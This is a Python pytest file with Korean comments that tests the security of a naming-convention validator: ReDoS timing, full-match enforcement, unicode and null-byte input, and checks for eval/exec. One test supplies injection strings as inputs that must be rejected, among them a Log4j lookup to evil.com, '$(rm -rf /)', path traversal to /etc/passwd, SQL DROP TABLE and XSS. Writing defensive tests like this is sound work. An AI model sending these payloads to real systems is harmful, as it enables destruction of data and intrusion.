"""
보안 테스트 - ReDoS 방어 및 부분 매치 방지
"""
import pytest
import time
import re
from core.validation.naming_convention import (
    NamingConventionEngine, NamingConvention, NamingRule,
    EntityType, NamingPattern, get_naming_engine
)


class TestReDoSProtection:
    """ReDoS (Regular expression Denial of Service) 방어 테스트"""
    
    def test_catastrophic_backtracking_prevention(self):
        """재앙적 백트래킹 방지 테스트"""
        # 상대적으로 안전한 패턴들로 테스트 (실제 ReDoS 패턴은 너무 위험)
        potentially_slow_patterns = [
            r"[a-zA-Z]+",  # 단순하지만 긴 문자열에서 느릴 수 있음
            r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$",  # 이메일 패턴
        ]
        
        for pattern in potentially_slow_patterns:
            rule = NamingRule(
                entity_type=EntityType.OBJECT_TYPE,
                pattern=NamingPattern.PASCAL_CASE,
                custom_regex=pattern,
                min_length=1,
                max_length=255  # 최대값 준수
            )
            
            convention = NamingConvention(
                id="test_performance",
                name="Performance Test",
                rules={EntityType.OBJECT_TYPE: rule},
                created_at="2025-01-15",
                updated_at="2025-01-15",
                created_by="test"
            )
            
            engine = NamingConventionEngine(convention)
            
            # 긴 입력 테스트
            test_inputs = [
                "A" * 100,  # 반복 문자
                "ValidName" * 20,  # 긴 유효한 이름
            ]
            
            for input_str in test_inputs:
                start_time = time.time()
                
                # 검증 실행
                result = engine.validate(EntityType.OBJECT_TYPE, input_str)
                
                elapsed = time.time() - start_time
                
                # 1초 이내에 완료되어야 함 (더 관대한 기준)
                assert elapsed < 1.0, f"Performance issue: Pattern '{pattern}' took {elapsed:.3f}s"
    
    def test_complex_input_performance(self):
        """복잡한 입력에 대한 성능 테스트"""
        engine = get_naming_engine()
        
        # 복잡한 입력 패턴들
        complex_inputs = [
            "HTTPHTTPHTTPServer" * 10,  # 반복된 약어
            "A" * 50 + "a" * 50,  # 대소문자 교차
            "Create" * 20 + "Object",  # 반복된 접두사
            "_" * 100 + "test",  # 많은 언더스코어
            "test" + "123" * 50,  # 많은 숫자
        ]
        
        for input_str in complex_inputs:
            start_time = time.time()
            
            # 각 엔티티 타입에 대해 검증
            for entity_type in EntityType:
                engine.validate(entity_type, input_str)
            
            elapsed = time.time() - start_time
            
            # 전체 검증이 500ms 이내
            assert elapsed < 0.5, f"Performance issue with input '{input_str[:20]}...': {elapsed:.3f}s"
    
    def test_regex_compilation_safety(self):
        """정규식 컴파일 안전성 테스트"""
        # 컴파일 시간이 오래 걸리는 패턴
        complex_patterns = [
            r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$",  # 복잡한 비밀번호 패턴
            r"^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$",  # 이메일
        ]
        
        for pattern in complex_patterns:
            start_time = time.time()
            
            # 안전하게 컴파일
            try:
                compiled = re.compile(pattern)
            except re.error:
                # 컴파일 오류는 정상적으로 처리
                continue
            
            elapsed = time.time() - start_time
            
            # 컴파일이 10ms 이내
            assert elapsed < 0.01, f"Regex compilation too slow: {elapsed:.3f}s"


class TestPartialMatchPrevention:
    """부분 매치 방지 테스트"""
    
    def test_custom_regex_full_match_enforcement(self):
        """커스텀 정규식의 전체 매치 강제"""
        # ^$ 없는 패턴으로 규칙 생성
        rule = NamingRule(
            entity_type=EntityType.BRANCH,
            pattern=NamingPattern.KEBAB_CASE,
            custom_regex=r'[a-z][a-z0-9\-]*',  # ^$ 없음
            min_length=1,
            max_length=100
        )
        
        convention = NamingConvention(
            id="test_partial",
            name="Partial Match Test",
            rules={EntityType.BRANCH: rule},
            created_at="2025-01-15",
            updated_at="2025-01-15",
            created_by="test"
        )
        
        engine = NamingConventionEngine(convention)
        
        # 부분 매치 시도
        test_cases = [
            ("feature-branch", True),   # 전체가 패턴과 일치
            ("Feature-Branch", False),  # 대문자 포함
            ("123-branch", False),      # 숫자로 시작
            ("branch-", True),          # 하이픈으로 끝남 (패턴상 허용)
            ("-branch", False),         # 하이픈으로 시작
            ("bra nch", False),         # 공백 포함
            ("branch!@#", False),       # 특수문자 포함
            ("valid-name-123", True),   # 유효한 이름
        ]
        
        for name, expected_valid in test_cases:
            result = engine.validate(EntityType.BRANCH, name)
            assert result.is_valid == expected_valid, \
                f"'{name}' validation failed: expected {expected_valid}, got {result.is_valid}"
    
    def test_pattern_regex_strict_matching(self):
        """패턴 정규식의 엄격한 매칭"""
        engine = get_naming_engine()
        
        # 각 패턴의 엄격한 매칭 테스트
        test_cases = [
            # camelCase
            (EntityType.PROPERTY, "validName", True),
            (EntityType.PROPERTY, "ValidName", False),  # PascalCase
            (EntityType.PROPERTY, "valid_name", False),  # snake_case
            (EntityType.PROPERTY, "valid-name", False),  # kebab-case
            (EntityType.PROPERTY, "123valid", False),    # 숫자로 시작
            
            # PascalCase
            (EntityType.OBJECT_TYPE, "ValidName", True),
            (EntityType.OBJECT_TYPE, "validName", False),  # camelCase
            (EntityType.OBJECT_TYPE, "Valid_Name", False),  # 언더스코어
            (EntityType.OBJECT_TYPE, "VALIDNAME", True),    # 모두 대문자도 패턴상 허용
            
            # kebab-case
            (EntityType.BRANCH, "feature-branch", True),
            (EntityType.BRANCH, "feature_branch", False),  # snake_case
            (EntityType.BRANCH, "featureBranch", False),   # camelCase
            (EntityType.BRANCH, "FEATURE-BRANCH", False),  # 대문자
        ]
        
        for entity_type, name, expected_valid in test_cases:
            result = engine.validate(entity_type, name)
            
            # 패턴 불일치가 이유인지 확인
            if not expected_valid:
                pattern_issues = [i for i in result.issues if i.rule_violated == "pattern"]
                assert len(pattern_issues) > 0, \
                    f"Expected pattern violation for '{name}' ({entity_type.value})"
    
    def test_injection_attack_prevention(self):
        """인젝션 공격 방지 테스트"""
        engine = get_naming_engine()
        
        # 인젝션 시도 패턴들
        injection_attempts = [
            "'; DROP TABLE users; --",  # SQL Injection
            "${jndi:ldap://evil.com/a}",  # Log4j 스타일
            "../../etc/passwd",  # Path Traversal
            "<script>alert('xss')</script>",  # XSS
            "{{7*7}}",  # Template Injection
            "${env.SECRET_KEY}",  # 환경변수 접근
            "$(rm -rf /)",  # Command Injection
            "`whoami`",  # Command Substitution
            "%0d%0aSet-Cookie:admin=true",  # CRLF Injection
        ]
        
        for malicious_input in injection_attempts:
            # 주요 엔티티 타입에 대해서만 테스트 (일부는 규칙이 없을 수 있음)
            test_entity_types = [EntityType.OBJECT_TYPE, EntityType.PROPERTY, EntityType.LINK_TYPE]
            
            for entity_type in test_entity_types:
                result = engine.validate(entity_type, malicious_input)
                
                # 특수문자나 패턴으로 인해 거부되어야 함
                assert not result.is_valid, \
                    f"Injection attempt not blocked: '{malicious_input}' for {entity_type.value}"
                
                # 특정 규칙 위반 확인
                violations = {issue.rule_violated for issue in result.issues}
                expected_violations = {"pattern", "forbidden_prefix", "min_length", "max_length", "custom_regex"}
                
                assert len(violations & expected_violations) > 0, \
                    f"No appropriate violation for injection attempt: '{malicious_input}'"


class TestInputSanitization:
    """입력 정제 테스트"""
    
    def test_unicode_handling(self):
        """유니코드 처리 테스트"""
        engine = get_naming_engine()
        
        # 다양한 유니코드 입력
        unicode_inputs = [
            "테스트클래스",  # 한글
            "测试类",  # 중국어
            "ТестКласс",  # 키릴 문자
            "café",  # 악센트
            "🚀Rocket",  # 이모지
            "\u200bHidden",  # Zero-width space
            "A\u0301B",  # Combining character
        ]
        
        for input_str in unicode_inputs:
            # 검증이 예외 없이 실행되어야 함
            try:
                result = engine.validate(EntityType.OBJECT_TYPE, input_str)
                # 대부분 패턴 불일치로 실패할 것
                assert not result.is_valid
            except Exception as e:
                pytest.fail(f"Unicode handling failed for '{input_str}': {e}")
    
    def test_null_byte_injection(self):
        """널 바이트 인젝션 테스트"""
        engine = get_naming_engine()
        
        # 널 바이트를 포함한 입력
        null_byte_inputs = [
            "Valid\x00Name",  # 중간에 널 바이트
            "\x00ValidName",  # 시작에 널 바이트
            "ValidName\x00",  # 끝에 널 바이트
            "Valid\x00\x00Name",  # 연속 널 바이트
        ]
        
        for input_str in null_byte_inputs:
            result = engine.validate(EntityType.OBJECT_TYPE, input_str)
            # 패턴 불일치로 거부되어야 함
            assert not result.is_valid
    
    def test_extremely_long_input(self):
        """매우 긴 입력 처리"""
        engine = get_naming_engine()
        
        # 매우 긴 입력 생성
        long_inputs = [
            "A" * 1000,  # 1000자
            "ValidName" * 100,  # 반복
            "a" * 10000,  # 10000자
        ]
        
        for input_str in long_inputs:
            start_time = time.time()
            
            result = engine.validate(EntityType.OBJECT_TYPE, input_str)
            
            elapsed = time.time() - start_time
            
            # 긴 입력도 빠르게 처리
            assert elapsed < 0.1, f"Long input processing too slow: {elapsed:.3f}s"
            
            # max_length 규칙으로 거부
            assert not result.is_valid
            assert any(i.rule_violated == "max_length" for i in result.issues)


class TestSecurityBestPractices:
    """보안 모범 사례 테스트"""
    
    def test_no_eval_or_exec(self):
        """eval/exec 사용 금지 확인"""
        import ast
        import os
        
        # 소스 코드 검사
        validation_dir = os.path.dirname(os.path.dirname(__file__))
        
        dangerous_calls = []
        
        for root, dirs, files in os.walk(validation_dir):
            for file in files:
                if file.endswith('.py') and not file.startswith('test_'):
                    file_path = os.path.join(root, file)
                    
                    with open(file_path, 'r', encoding='utf-8') as f:
                        try:
                            tree = ast.parse(f.read())
                            
                            for node in ast.walk(tree):
                                if isinstance(node, ast.Call):
                                    if isinstance(node.func, ast.Name):
                                        if node.func.id in ['eval', 'exec', 'compile']:
                                            dangerous_calls.append({
                                                'file': file_path,
                                                'line': node.lineno,
                                                'func': node.func.id
                                            })
                        except:
                            # 파싱 오류는 무시
                            pass
        
        assert len(dangerous_calls) == 0, \
            f"Found dangerous function calls: {dangerous_calls}"
    
    def test_secure_random_usage(self):
        """안전한 랜덤 사용 확인"""
        # 명명 규칙 엔진은 랜덤을 사용하지 않아야 함
        # 만약 사용한다면 secrets 모듈 사용 권장
        import ast
        import os
        
        validation_dir = os.path.dirname(os.path.dirname(__file__))
        
        random_usage = []
        
        for root, dirs, files in os.walk(validation_dir):
            for file in files:
                if file.endswith('.py') and not file.startswith('test_'):
                    file_path = os.path.join(root, file)
                    
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                        
                        # random 모듈 import 확인
                        if 'import random' in content and 'import secrets' not in content:
                            random_usage.append(file_path)
        
        # 보안이 중요한 곳에서는 secrets 모듈 사용 권장
        for file_path in random_usage:
            print(f"Warning: {file_path} uses 'random' instead of 'secrets'")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])